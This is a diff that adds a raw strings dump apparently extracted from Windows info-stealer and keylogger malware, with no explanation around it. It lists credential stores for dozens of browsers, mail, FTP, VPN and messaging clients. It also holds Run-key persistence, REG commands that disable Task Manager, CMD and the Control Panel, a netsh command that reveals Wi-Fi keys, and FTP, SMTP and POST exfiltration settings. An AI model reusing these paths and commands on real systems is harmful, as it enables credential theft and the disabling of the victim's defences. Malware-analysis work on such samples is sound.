@@ -1,0 +1,829 @@
+1  .lnk
+2  .lnk
+3  .lnk
+4  WScript.Shell
+5  CreateShortcut
+6  .lnk
+7  TargetPath
+8  cmd.exe
+9  WorkingDirectory
+10  Arguments
+11  /c start 
+12  &start 
+13   & exit
+14  IconLocation
+15  Save
+16   .lnk
+17  WScript.Shell
+18  CreateShortcut
+19   .lnk
+20  TargetPath
+21  cmd.exe
+22  WorkingDirectory
+23  Arguments
+24  /c start 
+25  &explorer /root,"%CD%
+26  " & exit
+27  IconLocation
+28  %SystemRoot%\system32\SHELL32.dll,3
+29  Save
+30  Software\Classes\
+31  OpenSubKey
+32  OpenSubKey
+33  GetValue
+34  \DefaultIcon\
+35  GetValue
+36  yyyy-MM-dd HH:mm:ss
+37  yyyy_MM_dd_HH_mm_ss
+38  <br>
+39  <hr>
+40  %urlkey%
+41  appdata
+42  \vidmp6\vidmp6.exe
+43  appdata
+44  \vidmp6\
+45  appdata
+46  \vidmp6\
+47  Software\Microsoft\Windows\CurrentVersion\Run
+48  vidmp6
+49  SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\StartupApproved\Run
+50  vidmp6
+51  Shutdown -r -t 5
+52  True
+53  http://xQRGNM.com
+54  \Rtj
+55  \Rtj
+56  SELECT * FROM Win32_Processor
+57  Name
+58  Unknown
+59  .zip
+60  .jpeg
+61  /log.tmp
+62  .html
+63  <html>
+64  </html>
+65  .html
+66  <html>
+67  </html>
+68  Time: 
+69  MM/dd/yyyy HH:mm:ss
+70  User Name: 
+71  Computer Name: 
+72  OSFullName: 
+73  CPU: 
+74  RAM: 
+75  uninstall
+76  Software\Microsoft\Windows NT\CurrentVersion\Windows
+77  Load
+78  Software\Microsoft\Windows\CurrentVersion\Run
+79  vidmp6
+80  %ftphost%/
+81  %ftpuser%
+82  %ftppassword%
+83  STOR
+84  Length
+85  Write
+86  Length
+87  Length
+88  Close
+89  %ftphost%/
+90  %ftpuser%
+91  %ftppassword%
+92  STOR
+93  Opera Browser
+94  Opera Software\Opera Stable\Login Data
+95  Yandex Browser
+96  Yandex\YandexBrowser\User Data
+97  360 Browser
+98  360Chrome\Chrome\User Data
+99  Iridium Browser
+100  Iridium\User Data
+101  Comodo Dragon
+102  Comodo\Dragon\User Data
+103  Cool Novo
+104  MapleStudio\ChromePlus\User Data
+105  Chromium
+106  Chromium\User Data
+107  Torch Browser
+108  Torch\User Data
+109  7Star
+110  7Star\7Star\User Data
+111  Amigo
+112  Amigo\User Data
+113  Brave
+114  BraveSoftware\Brave-Browser\User Data
+115  CentBrowser
+116  CentBrowser\User Data
+117  Chedot
+118  Chedot\User Data
+119  Coccoc
+120  CocCoc\Browser\User Data
+121  Elements Browser
+122  Elements Browser\User Data
+123  Epic Privacy
+124  Epic Privacy Browser\User Data
+125  Kometa
+126  Kometa\User Data
+127  Orbitum
+128  Orbitum\User Data
+129  Sputnik
+130  Sputnik\Sputnik\User Data
+131  Uran
+132  uCozMedia\Uran\User Data
+133  Vivaldi
+134  Vivaldi\User Data
+135  Citrio
+136  CatalinaGroup\Citrio\User Data
+137  Liebao Browser
+138  liebao\User Data
+139  Sleipnir 6
+140  Fenrir Inc\Sleipnir5\setting\modules\ChromiumViewer
+141  QIP Surf
+142  QIP Surf\User Data
+143  Coowon
+144  Coowon\Coowon\User Data
+145  URL:
+146  Username:
+147  Password:
+148  Application:
+149  .html
+150  <html>
+151  </html>
+152  ricardo.ospina@bnb-spa.com
+153  //password-to-account-eddited//
+154  smtp.bnb-spa.com
+155  ricardo.ospina@bnb-spa.com
+156  ricardo.ospina@bnb-spa.com
+157  text/html
+158  .html
+159  .html
+160  .jpeg
+161  image/jpg
+162  .zip
+163  application/zip
+164  :Zone.Identifier
+165  HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System
+166  EnableLUA
+167  REG add HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System /v DisableTaskMgr /t REG_DWORD /d 1 /f
+168  REG add HKCU\Software\Policies\Microsoft\Windows\System /v DisableCMD /t REG_DWORD /d 1 /f
+169  HKEY_CURRENT_USER\Software\Policies\Microsoft\Windows\System
+170  DisableCMD
+171  REG add HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer /v NoRun /t REG_DWORD /d 1 /f
+172  REG add HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer /v NoControlPanel /t REG_DWORD /d 1 /f
+173  HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\System
+174  DisableRegistryTools
+175  HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\SystemRestore
+176  DisableSR
+177  REG add HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer /v NoFolderOptions /t REG_DWORD /d 1 /f
+178  REG add HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer /v NoFolderOptions /t REG_DWORD /d 1 /f
+179  SOFTWARE\Microsoft\Windows\CurrentVersion\App Paths
+180  MSCONFIG.EXE
+181  \tmpG
+182  .tmp
+183  %PostURL%
+184  Mozilla/5.0 (Windows; U; Windows NT 6.1; ru; rv:1.9.2.3) Gecko/20100401 Firefox/4.0 (.NET CLR 3.5.30729)
+185  POST
+186  application/x-www-form-urlencoded
+187  &amp;
+188  &lt;
+189  &gt;
+190  &quot;
+191  <b>[clipboard]</b>
+192  <b>[clipboard]</b>
+193  <font color="#008000"><b>[ 
+194  </b>
+195   <b>]</b> <font color="#000000">(
+196  MM/dd/yyyy HH:mm:ss
+197  )</font></font>
+198  False
+199  <font color="#008000">{BACK}</font>
+200  </font>
+201  <font color="#008000">{ALT+TAB}</font>
+202  <font color="#008000">{ALT+F4}</font>
+203  <font color="#008000">{TAB}</font>
+204  <font color="#008000">{ESC}</font>
+205  <font color="#008000">{Win}</font>
+206  <font color="#008000">{CAPSLOCK}</font>
+207  <font color="#008000">&uarr;</font>
+208  <font color="#008000">&darr;</font>
+209  <font color="#008000">&larr;</font>
+210  <font color="#008000">&rarr;</font>
+211  <font color="#008000">{DEL}</font>
+212  <font color="#008000">{END}</font>
+213  <font color="#008000">{HOME}</font>
+214  <font color="#008000">{Insert}</font>
+215  <font color="#008000">{NumLock}</font>
+216  <font color="#008000">{PageDown}</font>
+217  <font color="#008000">{PageUp}</font>
+218  <font color="#008000">{ENTER}</font>
+219  <font color="#008000">{F1}</font>
+220  <font color="#008000">{F2}</font>
+221  <font color="#008000">{F3}</font>
+222  <font color="#008000">{F4}</font>
+223  <font color="#008000">{F5}</font>
+224  <font color="#008000">{F6}</font>
+225  <font color="#008000">{F7}</font>
+226  <font color="#008000">{F8}</font>
+227  <font color="#008000">{F9}</font>
+228  <font color="#008000">{F10}</font>
+229  <font color="#008000">{F11}</font>
+230  <font color="#008000">{F12}</font>
+231  control
+232  <font color="#008000">{CTRL}</font>
+233  &amp;
+234  &lt;
+235  &gt;
+236  &quot;
+237  .zip
+238  Cookies
+239  Chrome
+240  \Google\Chrome\User Data
+241  Opera
+242  Opera Software\Opera Stable
+243  Yandex
+244  Yandex\YandexBrowser\User Data
+245  360 Browser
+246  \360Chrome\Chrome\User Data
+247  Comodo Dragon
+248  Comodo\Dragon\User Data
+249  CoolNovo
+250  MapleStudio\ChromePlus\User Data
+251  SRWare Iron
+252  Chromium\User Data
+253  Torch Browser
+254  Torch\User Data
+255  Brave Browser
+256  BraveSoftware\Brave-Browser\User Data
+257  Iridium Browser
+258  \Iridium\User Data
+259  7Star
+260  7Star\7Star\User Data
+261  Amigo
+262  Amigo\User Data
+263  CentBrowser
+264  CentBrowser\User Data
+265  Chedot
+266  Chedot\User Data
+267  CocCoc
+268  CocCoc\Browser\User Data
+269  Elements Browser
+270  Elements Browser\User Data
+271  Epic Privacy Browser
+272  Epic Privacy Browser\User Data
+273  Kometa
+274  Kometa\User Data
+275  Orbitum
+276  Orbitum\User Data
+277  Sputnik
+278  Sputnik\Sputnik\User Data
+279  uCozMedia
+280  uCozMedia\Uran\User Data
+281  Vivaldi
+282  Vivaldi\User Data
+283  Sleipnir 6
+284  Fenrir Inc\Sleipnir5\setting\modules\ChromiumViewer
+285  Citrio
+286  CatalinaGroup\Citrio\User Data
+287  Coowon
+288  Coowon\Coowon\User Data
+289  Liebao Browser
+290  liebao\User Data
+291  QIP Surf
+292  QIP Surf\User Data
+293  QQ Browser
+294  Tencent\QQBrowser\User Data
+295  UC Browser
+296  UCBrowser\
+297  .zip
+298  cookies.sqlite
+299  Firefox
+300  APPDATA
+301  \Mozilla\Firefox\
+302  Postbox
+303  APPDATA
+304  \Postbox\
+305  Thunderbird
+306  APPDATA
+307  \Thunderbird\
+308  SeaMonkey
+309  APPDATA
+310  \Mozilla\SeaMonkey\
+311  Flock
+312  APPDATA
+313  \Flock\Browser\
+314  BlackHawk
+315  APPDATA
+316  \NETGATE Technologies\BlackHawk\
+317  CyberFox
+318  APPDATA
+319  \8pecxstudios\Cyberfox\
+320  K-Meleon
+321  APPDATA
+322  \K-Meleon\
+323  IceCat
+324  APPDATA
+325  \Mozilla\icecat\
+326  PaleMoon
+327  APPDATA
+328  \Moonchild Productions\Pale Moon\
+329  IceDragon
+330  APPDATA
+331  \Comodo\IceDragon\
+332  WaterFox
+333  APPDATA
+334  \Waterfox\
+335  Path=([A-z0-9\/\.\-]+)
+336  profiles.ini
+337  \Default\
+338  Profile
+339  None
+340  win32_processor
+341  processorID
+342  WinMgmts:
+343  InstancesOf
+344  Win32_BaseBoard
+345  SerialNumber
+346  origin_url
+347  username_value
+348  password_value
+349  \Default\Login Data
+350  \Login Data
+351  Profile
+352  \Login Data
+353  \Google\Chrome\User Data\
+354  Chrome
+355  logins
+356  Firefox
+357  Firefox
+358  Major
+359  Minor
+360  2F1A6504-0641-44CF-8BB5-3612D865F2E5
+361  Windows Secure Note
+362  3CCD5499-87A8-4B10-A215-608888DD3B55
+363  Windows Web Password Credential
+364  154E23D0-C644-4E6F-8CE6-5069272F999F
+365  Windows Credential Picker Protector
+366  4BF4C442-9B8A-41A0-B380-DD4A704DDB28
+367  Web Credentials
+368  77BC582B-F0A6-4E15-4E80-61736B6F3B29
+369  Windows Credentials
+370  E69D7838-91B5-4FC9-89D5-230D4D4CC2BC
+371  Windows Domain Certificate Credential
+372  3E0E35BE-1B77-43E7-B873-AED901B6275B
+373  Windows Domain Password Credential
+374  3C886FF3-2669-4AA2-A8FB-3F6759A77548
+375  Windows Extended Credential
+376  00000000-0000-0000-0000-000000000000
+377  82BD0E67-9FEA-4748-8672-D5EFE5B779B0
+378  Windows Generic Credential
+379  PtrToStructure
+380  ToInt64
+381  SchemaId
+382  pResourceElement
+383  pIdentityElement
+384  LastModified
+385  pPackageSid
+386  pAuthenticatorElement
+387  IE/Edge
+388  Type
+389  Value
+390  \Common Files\Apple\Apple Application Support\plutil.exe
+391  \Apple Computer\Preferences\keychain.plist
+392  SeaMonkey
+393  SeaMonkey
+394  logins
+395  UCBrowser\
+396  Login Data
+397  journal
+398  UC Browser
+399  wow_logins
+400  Tencent\QQBrowser\User Data
+401  \Default\EncryptedStorage
+402  Profile
+403  \EncryptedStorage
+404  entries
+405  category
+406  Password
+407  str3
+408  str2
+409  blob0
+410  QQ Browser
+411  PopPassword
+412  SmtpPassword
+413  Software\IncrediMail\Identities\
+414  \Accounts_New
+415  PopPassword
+416  SmtpPassword
+417  EmailAddress
+418  SmtpServer
+419  incredimail
+420  HKEY_CURRENT_USER\Software\Qualcomm\Eudora\CommandLine
+421  current
+422  Settings
+423  SavePasswordText
+424  Settings
+425  ReturnAddress
+426  Eudora
+427  Thunderbird
+428  Thunderbird
+429  BlackHawk
+430  BlackHawk
+431  CyberFox
+432  CyberFox
+433  K-Meleon
+434  K-Meleon
+435  IceCat
+436  IceCat
+437  PaleMoon
+438  PaleMoon
+439  IceDragon
+440  IceDragon
+441  WaterFox
+442  WaterFox
+443  \falkon\profiles\
+444  startProfile="([A-z0-9\/\.]+)"
+445  profiles.ini
+446  \browsedata.db
+447  autofill
+448  Falkon Browser
+449  startProfile=([A-z0-9\/\.]+)
+450  profiles.ini
+451  Backend=([A-z0-9\/\.-]+)
+452  \settings.ini
+453  \browsedata.db
+454  autofill
+455  Falkon Browser
+456  \Claws-mail
+457  \clawsrc
+458  \clawsrc
+459  passkey0
+460  master_passphrase_salt=(.+)
+461  master_passphrase_pbkdf2_rounds=(.+)
+462  use_master_passphrase=(.+)
+463  \accountrc
+464  smtp_server
+465  address
+466  account
+467  \passwordstorerc
+468  {(.*),(.*)}(.*)
+469  ClawsMail
+470  TransformFinalBlock
+471  Substring
+472  IterationCount
+473  GetBytes
+474  Postbox
+475  Postbox
+476  signons3.txt
+477  objects
+478  objects
+479  objects
+480  Data
+481  objects
+482  objects
+483  Data
+484  DecryptTripleDes
+485  Flock Browser
+486  netsh
+487  wlan show profile
+488  All User Profile
+489  All User Profile * : (?<profile>.*)
+490  profile
+491  Wi-Fi
+492  wlan show profile name="
+493  " key=clear
+494  Key Content * : (?<password>.*)
+495  password
+496  ALLUSERSPROFILE
+497  DynDNS\Updater\config.dyndns
+498  username=
+499  password=
+500  t6KzXhCh
+501  http://DynDns.com
+502  DynDNS
+503  APPDATA
+504  \Psi\profiles
+505  APPDATA
+506  \Psi+\profiles
+507  \accounts.xml
+508  \accounts.xml
+509  name
+510  password
+511  Psi/Psi+
+512  Software\OpenVPN-GUI\configs
+513  Software\OpenVPN-GUI\configs
+514  Software\OpenVPN-GUI\configs\
+515  username
+516  auth-data
+517  entropy
+518  Open VPN
+519  USERPROFILE
+520  \OpenVPN\config\
+521  remote 
+522  remote 
+523  APPDATA
+524  \FileZilla\recentservers.xml
+525  <Server>
+526  <Host>
+527  <Host>
+528  </Host>
+529  <Port>
+530  </Port>
+531  <User>
+532  <User>
+533  </User>
+534  <Pass encoding="base64">
+535  <Pass encoding="base64">
+536  </Pass>
+537  <Pass>
+538  <Pass>
+539  </Pass>
+540  FileZilla
+541  SOFTWARE\\Martin Prikryl\\WinSCP 2\\Sessions
+542  HostName
+543  UserName
+544  Password
+545  PublicKeyFile
+546  PortNumber
+547  [PRIVATE KEY LOCATION: "{0}"]
+548  WinSCP
+549  APPDATA
+550  Username
+551  All Users
+552  \FlashFXP\3quick.dat
+553  port=
+554  user=
+555  pass=
+556  created=
+557  FlashFXP
+558  SystemDrive
+559  \FTP Navigator\Ftplist.txt
+560  Server
+561  Password
+562  No Password
+563  User
+564  FTP Navigator
+565  Programfiles(x86)
+566  programfiles
+567  \jDownloader\config\database.script
+568  programfiles(x86)
+569  \jDownloader\config\database.script
+570  INSERT INTO CONFIG VALUES('AccountController','
+571  JDownloader
+572  Software\Paltalk
+573  HKEY_CURRENT_USER\Software\Paltalk\
+574  Paltalk
+575  APPDATA
+576  \.purple\accounts.xml
+577  APPDATA
+578  \.purple\accounts.xml
+579  <account>
+580  <protocol>
+581  </protocol>
+582  <name>
+583  </name>
+584  <password>
+585  </password>
+586  Pidgin
+587  APPDATA
+588  \SmartFTP\Client 2.0\Favorites\Quick Connect\
+589  APPDATA
+590  \SmartFTP\Client 2.0\Favorites\Quick Connect\*.xml
+591  <Host>
+592  </Host>
+593  <Port>
+594  </Port>
+595  <User>
+596  </User>
+597  <Password>
+598  </Password>
+599  <Name>
+600  </Name>
+601  SmartFTP
+602  appdata
+603  \Ipswitch\WS_FTP\Sites\ws_ftp.ini
+604  appdata
+605  \Ipswitch\WS_FTP\Sites\ws_ftp.ini
+606  HOST
+607  WS_FTP
+608  PWD=
+609  PWD=
+610  Substring
+611  Length
+612  Length
+613  Substring
+614  Substring
+615  Mode
+616  Padding
+617  CreateDecryptor
+618  SystemDrive
+619  \cftp\Ftplist.txt
+620  ;Server=
+621  ;Port=
+622  ;Port=
+623  ;Password=
+624  ;User=
+625  ;Anonymous=
+626  ;Password=
+627  ;User=
+628  Name=
+629  ;Server=
+630  FTPCommander
+631  \FTPGetter\servers.xml
+632  <server>
+633  <server_ip>
+634  <server_ip>
+635  </server_ip>
+636  <server_port>
+637  </server_port>
+638  <server_user_name>
+639  <server_user_name>
+640  </server_user_name>
+641  <server_user_password>
+642  <server_user_password>
+643  </server_user_password>
+644  FTPGetter
+645  HKEY_LOCAL_MACHINE\SOFTWARE\Vitalwerks\DUC
+646  HKEY_CURRENT_USER\SOFTWARE\Vitalwerks\DUC
+647  USERname
+648  Password
+649  UserName
+650  Password
+651  NO-IP
+652  NO-IP
+653  +-0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz
+654  appdata
+655  \The Bat!
+656  appdata
+657  \The Bat!
+658  \Account.CFN
+659  \Account.CFN
+660  TheBat
+661  HKEY_CURRENT_USER\Software\RimArts\B2\Settings
+662  DataDir
+663  Folder.lst
+664  \Mailbox.ini
+665  Account
+666  SMTPServer
+667  Account
+668  MailAddress
+669  Account
+670  PassWd
+671  Becky!
+672  \Trillian\users\global\accounts.dat
+673  Account
+674  Accounts
+675  Account
+676  Password
+677  Trillian
+678  Length
+679  Software\Microsoft\Office\15.0\Outlook\Profiles\Outlook\9375CFF0413111d3B88A00104B2A6676
+680  Software\Microsoft\Windows NT\CurrentVersion\Windows Messaging Subsystem\Profiles\Outlook\9375CFF0413111d3B88A00104B2A6676
+681  Software\Microsoft\Windows Messaging Subsystem\Profiles\9375CFF0413111d3B88A00104B2A6676
+682  Software\Microsoft\Office\16.0\Outlook\Profiles\Outlook\9375CFF0413111d3B88A00104B2A6676
+683  Email
+684  IMAP Password
+685  POP3 Password
+686  HTTP Password
+687  SMTP Password
+688  IMAP Password
+689  POP3 Password
+690  HTTP Password
+691  SMTP Password
+692  Email
+693  GetBytes
+694  SMTP Server
+695  SMTP Server
+696  SMTP Server
+697  Outlook
+698  HKEY_CURRENT_USER\Software\Aerofox\FoxmailPreview
+699  Executable
+700  HKEY_CURRENT_USER\Software\Aerofox\Foxmail\V3.1
+701  FoxmailPath
+702  \Storage\
+703  \Storage\
+704  \mail\
+705  \mail\
+706  \VirtualStore\Program Files\Foxmail\mail\
+707  \VirtualStore\Program Files\Foxmail\mail\
+708  \VirtualStore\Program Files (x86)\Foxmail\mail\
+709  \VirtualStore\Program Files (x86)\Foxmail\mail\
+710  \Accounts\Account.rec0
+711  \Account.stg
+712  Length
+713  Read
+714  Close
+715  Dispose
+716  POP3Host
+717  SMTPHost
+718  IncomingServer
+719  Account
+720  MailAddress
+721  Password
+722  POP3Password
+723  Foxmail
+724  \Opera Mail\Opera Mail\wand.dat
+725  \Opera Mail\Opera Mail\wand.dat
+726  opera:
+727  Opera Mail
+728  abcçdefgğhıijklmnoöpqrsştuüvwxyz1234567890_-.~!@#$%^&*()[{]}\|';:,<>/?+=
+ 
+729  appdata
+730  \Pocomail\accounts.ini
+731  appdata
+732  \Pocomail\accounts.ini
+733  Email
+734  POPPass
+735  SMTPPass
+736  SMTP
+737  PocoMail
+738  <array>
+739  <dict>
+740  Length
+741  <string>
+742  </string>
+743  <string>
+744  </string>
+745  <data>
+746  </data>
+747  Safari Browser
+748   -convert xml1 -s -o "
+749  \fixed_keychain.xml" 
+750  ABCDEF
+751  APPDATA
+752  \Mozilla\Firefox\
+753  \Postbox\
+754  \Thunderbird\
+755  \Mozilla\SeaMonkey\
+756  \Flock\Browser\
+757  \NETGATE Technologies\BlackHawk\
+758  \8pecxstudios\Cyberfox\
+759  \K-Meleon\
+760  \Mozilla\icecat\
+761  \Moonchild Productions\Pale Moon\
+762  \Comodo\IceDragon\
+763  \Waterfox\
+764  key4.db
+765  key4.db
+766  metaData
+767  password
+768  item1
+769  item2
+770  nssPrivate
+771  a102
+772  key3.db
+773  key3.db
+774  global-salt
+775  Version
+776  password-check
+777  Value
+778  global-salt
+779  Value
+780  Replace
+781  Path=([A-z0-9\/\.\-]+)
+782  profiles.ini
+783  logins.json
+784  logins.json
+785  \"(hostname|encryptedPassword|encryptedUsername)":"(.*?)"
+786  [^\u0020-\u007F]
+787  [^\u0020-\u007F]
+788  signons.sqlite
+789  moz_logins
+790  hostname
+791  encryptedUsername
+792  encryptedPassword
+793  [^\u0020-\u007F]
+794  [^\u0020-\u007F]
+795  Mode
+796  Padding
+797  CreateDecryptor
+798  TransformFinalBlock
+799  Mode
+800  Padding
+801  CreateDecryptor
+802  TransformFinalBlock
+803  Mode
+804  Padding
+805  CreateDecryptor
+806  TransformFinalBlock
+807  EndsWith
+808  Substring
+809  Length
+810  IndexOf
+811  Substring
+812  IndexOf
+813  UNIQUE
+814  table
+815  Software\DownloadManager\Passwords\
+816  User
+817  EncPassword
+818  Internet Download Manager
+819  SystemDrive
+820  WScript.Shell
+821  RegRead
+822  Stream cannot seek
+823  Writing is not alowed
+824  Writing is not allowed
+825  Writing is not alowed
+826  Central directory currently does not exist
+827  Stream cannot be written
+828  RemoveEntries is allowed just over streams of type FileStream
